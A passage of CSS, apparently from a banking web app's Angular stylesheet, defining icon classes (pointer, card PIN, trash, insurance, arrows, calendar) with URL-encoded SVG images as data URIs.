20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%2210-service%2F125-customer-service%22%20transform%3D%22translate%287.000000%2C%207.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22mask-4%22%20fill%3D%22white%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23path-3%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20id%3D%22Mask%22%20fill%3D%22%23046EAE%22%20fill-rule%3D%22evenodd%22%20xlink%3Ahref%3D%22%23path-3%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22color%2Fb1%22%20mask%3D%22url%28%23mask-4%29%22%20fill%3D%22%23002A54%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20id%3D%22Color-%2F-B1%22%20x%3D%220%22%20y%3D%220%22%20width%3D%2226%22%20height%3D%2226%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-pointer-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20width%3D%2240px%22%20height%3D%2240px%22%20viewBox%3D%220%200%2040%2040%22%20version%3D%221.1%22%3E%0A%20%20%20%20%3C!--%20Generator%3A%20Sketch%2053.1%20%2872631%29%20-%20https%3A%2F%2Fsketchapp.com%20--%3E%0A%20%20%20%20%3Ctitle%3E053-arrow-pointer-white-circle%3C%2Ftitle%3E%0A%20%20%20%20%3Cdesc%3ECreated%20with%20Sketch.%3C%2Fdesc%3E%0A%20%20%20%20%3Cdefs%3E%0A%20%20%20%20%20%20%20%20%3Ccircle%20id%3D%22path-1%22%20cx%3D%2219%22%20cy%3D%2219%22%20r%3D%2219%22%2F%3E%0A%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M19.6510105%2C1.575%20L6.15601046%2C9.95%20C5.83501046%2C10.149%205.84301046%2C10.618%206.17001046%2C10.807%20L6.17001046%2C10.807%20L10.0670105%2C13.057%20L5.31701046%2C21.285%20C5.17901046%2C21.524%205.26101046%2C21.83%205.50001046%2C21.968%20L5.50001046%2C21.968%20L9.87201046%2C24.493%20C10.1110105%2C24.631%2010.4170105%2C24.549%2010.5560105%2C24.309%20L10.5560105%2C24.309%20L15.3060105%2C16.081%20L19.1600105%2C18.308%20C19.4870105%2C18.497%2019.8980105%2C18.268%2019.9100105%2C17.89%20L19.9100105%2C17.89%20L20.4150105%2C2.016%20L20.4150105%2C1.983%20C20.4060105%2C1.7%2020.1700105%2C1.5%2019.9140105%2C1.5%20L19.9140105%2C1.5%20C19.8260105%2C1.5%2019.7350105%2C1.523%2019.6510105%2C1.575%20L19.6510105%2C1.575%20Z%20M6.43301046%2C21.352%20L11.1830105%2C13.125%20C11.3210105%2C12.885%2011.2390105%2C12.579%2011.0000105%2C12.442%20L11.0000105%2C12.442%20L7.39301046%2C10.359%20L19.3850105%2C2.917%20L18.9370105%2C17.024%20L15.3720105%2C14.966%20C15.1330105%2C14.828%2014.8270105%2C14.91%2014.6890105%2C15.149%20L14.6890105%2C15.149%20L9.93901046%2C23.377%20L6.43301046%2C21.352%20Z%22%20id%3D%22path-3%22%2F%3E%0A%20%20%20%20%3C%2Fdefs%3E%0A%20%20%20%20%3Cg%20id%3D%22Symbols%22%20stroke%3D%22none%22%20stroke-width%3D%221%22%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cg%20id%3D%2299-icon-template%2F01-template%22%20transform%3D%22translate%28-1.000000%2C%200.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%2299-icon-template%2F02-circle%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Circle%22%20transform%3D%22translate%281.000000%2C%201.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22mask-2%22%20fill%3D%22white%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23path-1%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Mask%22%20fill-rule%3D%22nonzero%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22color%2Fwhite%22%20mask%3D%22url%28%23mask-2%29%22%20fill%3D%22%23FFFFFF%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20transform%3D%22translate%28-1.000000%2C%20-1.000000%29%22%20id%3D%22Color-%2F-White%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20x%3D%220%22%20y%3D%220%22%20width%3D%2240%22%20height%3D%2240%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%2201-direction%2F053-arrow-pointer%22%20transform%3D%22translate%287.000000%2C%207.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22mask-4%22%20fill%3D%22white%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23path-3%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22icon%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22color%2Fb1%22%20mask%3D%22url%28%23mask-4%29%22%20fill%3D%22%23002A54%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20id%3D%22Color-%2F-B1%22%20x%3D%220%22%20y%3D%220%22%20width%3D%2226%22%20height%3D%2226%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-cardPin-light[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20width%3D%2240px%22%20height%3D%2240px%22%20viewBox%3D%220%200%2040%2040%22%20version%3D%221.1%22%3E%0A%20%20%20%20%3C!--%20Generator%3A%20Sketch%2053.1%20%2872631%29%20-%20https%3A%2F%2Fsketchapp.com%20--%3E%0A%20%20%20%20%3Ctitle%3E185-card-pin-white-circle%3C%2Ftitle%3E%0A%20%20%20%20%3Cdesc%3ECreated%20with%20Sketch.%3C%2Fdesc%3E%0A%20%20%20%20%3Cdefs%3E%0A%20%20%20%20%20%20%20%20%3Ccircle%20id%3D%22path-1%22%20cx%3D%2219%22%20cy%3D%2219%22%20r%3D%2219%22%2F%3E%0A%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M23.3496%2C4%20L2.6496%2C4%20C1.7356%2C4%200.9996%2C4.776%200.9996%2C5.714%20L0.9996%2C20.286%20C0.9996%2C21.224%201.7356%2C22%202.6496%2C22%20L23.3496%2C22%20C24.2656%2C22%2024.9996%2C21.224%2024.9996%2C20.286%20L24.9996%2C5.714%20C24.9996%2C4.776%2024.2656%2C4%2023.3496%2C4%20M23.3496%2C21%20L2.6496%2C21%20C2.2996%2C21%201.9996%2C20.684%201.9996%2C20.286%20L1.9996%2C9%20L23.9996%2C9%20L23.9996%2C20.286%20C23.9996%2C20.684%2023.7006%2C21%2023.3496%2C21%20M2.6496%2C5%20L23.3496%2C5%20C23.7006%2C5%2023.9996%2C5.316%2023.9996%2C5.714%20L23.9996%2C8%20L1.9996%2C8%20L1.9996%2C5.714%20C1.9996%2C5.316%202.2996%2C5%202.6496%2C5%20M9.5%2C14%20L11.5%2C14%20C12.167%2C14%2012.167%2C15%2011.5%2C15%20L9.5%2C15%20C8.833%2C15%208.833%2C14%209.5%2C14%20M4.5%2C14%20L6.5%2C14%20C7.167%2C14%207.167%2C15%206.5%2C15%20L4.5%2C15%20C3.833%2C15%203.833%2C14%204.5%2C14%20M19.5%2C14%20L21.5%2C14%20C22.167%2C14%2022.167%2C15%2021.5%2C15%20L19.5%2C15%20C18.833%2C15%2018.833%2C14%2019.5%2C14%20M14.5%2C14%20L16.5%2C14%20C17.167%2C14%2017.167%2C15%2016.5%2C15%20L14.5%2C15%20C13.833%2C15%2013.833%2C14%2014.5%2C14%22%20id%3D%22path-3%22%2F%3E%0A%20%20%20%20%3C%2Fdefs%3E%0A%20%20%20%20%3Cg%20id%3D%22Symbols%22%20stroke%3D%22none%22%20stroke-width%3D%221%22%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cg%20id%3D%2299-icon-template%2F01-template%22%20transform%3D%22translate%28-1.000000%2C%200.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%2299-icon-template%2F02-circle%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Circle%22%20transform%3D%22translate%281.000000%2C%201.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22mask-2%22%20fill%3D%22white%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23path-1%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Mask%22%20fill-rule%3D%22nonzero%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22color%2Fwhite%22%20mask%3D%22url%28%23mask-2%29%22%20fill%3D%22%23FFFFFF%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20transform%3D%22translate%28-1.000000%2C%20-1.000000%29%22%20id%3D%22Color-%2F-White%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20x%3D%220%22%20y%3D%220%22%20width%3D%2240%22%20height%3D%2240%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%2207-card%2F185-card-pin%22%20transform%3D%22translate%287.000000%2C%207.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cmask%20id%3D%22mask-4%22%20fill%3D%22white%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20xlink%3Ahref%3D%22%23path-3%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fmask%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cuse%20id%3D%22Mask%22%20fill%3D%22%23046EAE%22%20fill-rule%3D%22evenodd%22%20xlink%3Ahref%3D%22%23path-3%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22color%2Fb1%22%20mask%3D%22url%28%23mask-4%29%22%20fill%3D%22%23002A54%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20id%3D%22Color-%2F-B1%22%20x%3D%220%22%20y%3D%220%22%20width%3D%2226%22%20height%3D%2226%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%20%20%20%20%3C%2Fg%3E%0A%20%20%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-trash-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_trash%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C12H27a4%2C4%2C0%2C0%2C0-4-4H19a4%2C4%2C0%2C0%2C0-4%2C4H9v2h2V30a4%2C4%2C0%2C0%2C0%2C4%2C4H27a4%2C4%2C0%2C0%2C0%2C4-4V14h2ZM19%2C10h4a2%2C2%2C0%2C0%2C1%2C2%2C2H17A2%2C2%2C0%2C0%2C1%2C19%2C10ZM29%2C30a2%2C2%2C0%2C0%2C1-2%2C2H15a2%2C2%2C0%2C0%2C1-2-2V27.21L29%2C18.7Zm0-13.57L13%2C24.94V14H29Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-ensurance-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%0A%3C!--%20Generator%3A%20Adobe%20Illustrator%2022.0.1%2C%20SVG%20Export%20Plug-In%20.%20SVG%20Version%3A%206.00%20Build%200%29%20%20--%3E%0A%3Csvg%20version%3D%221.1%22%20id%3D%22Layer%5f1%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20x%3D%220px%22%20y%3D%220px%22%0A%09%20viewBox%3D%220%200%2040%2040%22%20style%3D%22enable-background%3Anew%200%200%2040%2040%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%09.st0%7Bfill%3A%23002A54%3B%7D%0A%3C%2Fstyle%3E%0A%3Cg%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M16.396%2C27.30609l-3.31598-2.66595c-1.24603-1.00201-1.96503-2.479-1.96503-4.03705v-5.96198%0A%09%09c0-0.60901%2C0.40002-1.151%2C0.99902-1.35498l4.73798-1.60699c0.315-0.10803%2C0.66003-0.11005%2C0.97803-0.00806l5.03296%2C1.62006%0A%09%09c0.61102%2C0.19598%2C1.02301%2C0.745%2C1.02301%2C1.362v2.35895c0.203-0.01599%2C0.40704-0.03101%2C0.61401-0.03101%0A%09%09c0.54303%2C0%2C1.07098%2C0.06104%2C1.58203%2C0.17004v-4.98401c0-0.20398-0.13403-0.38501-0.33405-0.453l-8.07996-2.729%0A%09%09c-0.10803-0.03601-0.22601-0.03601-0.33405%2C0l-8.00098%2C2.72803C9.133%2C11.78113%2C9%2C11.96112%2C9%2C12.1651v8.61798%0A%09%09c0%2C2.55304%2C1.25%2C4.96002%2C3.37598%2C6.49902l4.82501%2C3.49402c0.17804%2C0.12799%2C0.42303%2C0.12897%2C0.60199%2C0.00098l1.32605-1.06702%0A%09%09c-0.59705-0.61298-1.08704-1.32996-1.448-2.11896C17.23798%2C27.68512%2C16.763%2C27.60114%2C16.396%2C27.30609z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M22.88599%2C17.1601v-2.50696c0-0.20605-0.138-0.38904-0.341-0.45404l-5.03296-1.62%0A%09%09c-0.10602-0.034-0.22101-0.03302-0.32605%2C0.00299l-4.73798%2C1.607c-0.20001%2C0.06799-0.33301%2C0.24902-0.33301%2C0.45203v5.96198%0A%09%09c0%2C1.27405%2C0.58801%2C2.48303%2C1.60803%2C3.30304l3.31598%2C2.66595c0.08398%2C0.06702%2C0.18597%2C0.09705%2C0.289%2C0.10205%0A%09%09c-0.21197-0.693-0.328-1.42902-0.328-2.193C17%2C20.8941%2C19.52002%2C17.89911%2C22.88599%2C17.1601z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M20%2C0.99963c-10.49341%2C0-19%2C8.50659-19%2C19s8.50659%2C19%2C19%2C19s19-8.50659%2C19-19S30.49341%2C0.99963%2C20%2C0.99963z%0A%09%09%20M24.5%2C31.98114c-1.75403%2C0-3.36298-0.60602-4.64099-1.61505c-0.271%2C0.21301-0.75299%2C0.60205-1.45703%2C1.177%0A%09%09c-0.53497%2C0.38403-1.26996%2C0.383-1.80298-0.00195l-4.82599-3.49506C9.396%2C26.32611%2C8%2C23.63708%2C8%2C20.78308V12.1651%0A%09%09c0-0.60901%2C0.39899-1.151%2C0.99701-1.35498l8.00201-2.72699C17.323%2C7.97211%2C17.67603%2C7.97211%2C18%2C8.08209l8.08002%2C2.729%0A%09%09c0.60101%2C0.203%2C1.00201%2C0.74603%2C1.00201%2C1.35602v5.27997C29.95001%2C18.5011%2C32%2C21.24811%2C32%2C24.48114%0A%09%09C32%2C28.62408%2C28.64301%2C31.98114%2C24.5%2C31.98114z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M24.5%2C17.98108c-3.59003%2C0-6.5%2C2.91003-6.5%2C6.50006c0%2C3.58997%2C2.90997%2C6.5%2C6.5%2C6.5s6.5-2.91003%2C6.5-6.5%0A%09%09C31%2C20.89111%2C28.09003%2C17.98108%2C24.5%2C17.98108z%20M28.23657%2C22.96613l-3.44299%2C3.58698l-0.02197%2C0.02301%0A%09%09c-0.58502%2C0.586-1.53503%2C0.586-2.12103%2C0l-1.00397-1.005c-0.19501-0.19501-0.19501-0.51202%2C0-0.70697%0A%09%09c0.19501-0.19501%2C0.51202-0.19501%2C0.70697%2C0l1.00403%2C1.00494c0.19501%2C0.19501%2C0.51099%2C0.19501%2C0.70697%2C0%0A%09%09c0.00305-0.00299%2C1.15204-1.20099%2C3.45001-3.59497c0.19-0.19897%2C0.508-0.20599%2C0.70703-0.01501%0A%09%09C28.42059%2C22.45111%2C28.42657%2C22.76709%2C28.23657%2C22.96613z%22%2F%3E%0A%3C%2Fg%3E%0A%3C%2Fsvg%3E%0A");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-four-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_4_arrows%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M41%2C21A20%2C20%2C0%2C1%2C1%2C21%2C1%2C20%2C20%2C0%2C0%2C1%2C41%2C21%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2236%2020%2028%2015.38%2028%2019%2021%2019%2021%2012%2024.62%2012%2020%204%2015.38%2012%2019%2012%2019%2019%2012%2019%2012%2015.38%204%2020%2012%2024.62%2012%2021%2019%2021%2019%2028%2015.38%2028%2020%2036%2024.62%2028%2021%2028%2021%2021%2028%2021%2028%2024.62%2036%2020%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-arrowdown-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_arrow_down%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M41%2C21A20%2C20%2C0%2C1%2C1%2C21%2C1%2C20%2C20%2C0%2C0%2C1%2C41%2C21%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M20%2C9V30.7a2%2C2%2C0%2C0%2C1-.58-.5L13.28%2C18.65l-1.77.94%2C5.73%2C10.77h0a4%2C4%2C0%2C0%2C0%2C7.44.17l5.8-10.94-1.77-.94-5.87%2C11a2%2C2%2C0%2C0%2C1-.86%2C1V9Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-arrowleft-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_arrow_left%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C1%2C41%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C20H11.3a2%2C2%2C0%2C0%2C1%2C.5-.58l11.55-6.14-.94-1.77L11.64%2C17.24v0a4%2C4%2C0%2C0%2C0-.17%2C7.44l10.94%2C5.8.94-1.77-11-5.87a2%2C2%2C0%2C0%2C1-1-.86H33Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-arrowright-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_arrow_right%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C1A20%2C20%2C0%2C1%2C1%2C1%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M9%2C22H30.7a2%2C2%2C0%2C0%2C1-.5.58L18.65%2C28.72l.94%2C1.77%2C10.77-5.73v0a4%2C4%2C0%2C0%2C0%2C.16-7.44l-10.94-5.8-.94%2C1.77%2C11%2C5.87a2%2C2%2C0%2C0%2C1%2C1%2C.86H9Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-arrowup-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_arrow_up%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M1%2C21A20%2C20%2C0%2C1%2C1%2C21%2C41%2C20%2C20%2C0%2C0%2C1%2C1%2C21%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M22%2C33V11.3a2%2C2%2C0%2C0%2C1%2C.57.5l6.14%2C11.55%2C1.77-.94L24.77%2C11.64h0a4%2C4%2C0%2C0%2C0-7.44-.17l-5.8%2C10.94%2C1.77.94%2C5.87-11a2%2C2%2C0%2C0%2C1%2C.86-1V33Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-calendar-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_calendar%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C11H27V9H25v2H17V9H15v2H9V27a6%2C6%2C0%2C0%2C0%2C6%2C6H27a6%2C6%2C0%2C0%2C0%2C6-6h0ZM15%2C13v2h2V13h8v2h2V13h4v4H11V13ZM31%2C27a4%2C4%2C0%2C0%2C1-4%2C4H15a4%2C4%2C0%2C0%2C1-4-4V19H31Zm-4.74-6%2C.94%2C1.77-9.65%2C5.09-.94-1.77h0L15%2C22.93%2C16.77%2C22l1.65%2C3.16Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-branch-dark[_ngcontent-yta-c101] {
